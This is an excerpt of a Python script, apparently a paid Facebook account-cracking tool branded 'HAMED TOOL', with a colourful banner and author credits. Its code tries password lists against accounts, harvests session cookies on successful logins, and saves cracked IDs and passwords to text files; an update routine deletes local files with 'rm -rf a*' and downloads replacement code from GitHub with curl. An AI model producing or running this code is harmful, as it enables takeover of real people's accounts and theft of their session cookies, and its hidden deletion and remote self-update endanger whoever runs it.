...
os.system('xdg-open ')
print('\n\033[1;36m[•]   WELCOME TO HAMED TOOL...');time.sleep(3)
...
\33[1;32m ##  ##  ##   ##  ##   ##   ##   #   ## ##   
\33[1;32m ##  ##  ##   ##  ### ###  #######  #####                             
\33[1;32m            \33[1;37m     [ \033[1;91m\033[1;41m\033[1;97m WORKING MOBILE DATA AND WIFI ALSO  \033[;0m\033[1;91m\033[1;92m \033[1;97m]                   \33[1;32m║
\33[1;32m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\33[1;32m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\33[1;33m╠══[AUTHOR        : {HAMED} 
\33[1;33m╠══[FACEBOOK.     : {HAMED Joo}   
\33[1;33m╠══[GITHUB        : {HAMED-Joo}
\33[1;33m╠══[REGIONAL.     : {AFGHANISTAN}
\33[1;33m╠══[TOOLS         : {PAID}
\33[1;33m╠══[VERSION       : {2. 0}
\33[1;32m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝""")  
def lines():
	print('\33[1;37m----------------------------------------------')
...
try:
    ...
    proxy = requests.get('https://raw.githubusercontent.com/HAMED-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/HAMED-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/HAMED-JUTT/HAMED/main/HAMED.py > HAMED.py')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[HAMED] '+cid+' | '+ps+'\033[0;97m\n[‎‎🍪]\033[0;37m COOKIE = \033[1;36m'+coki+  '  ''  \033[0;97m')
                open('HAMED-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                #print('[HAMED-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('HAMED.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mHAMED-XD\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
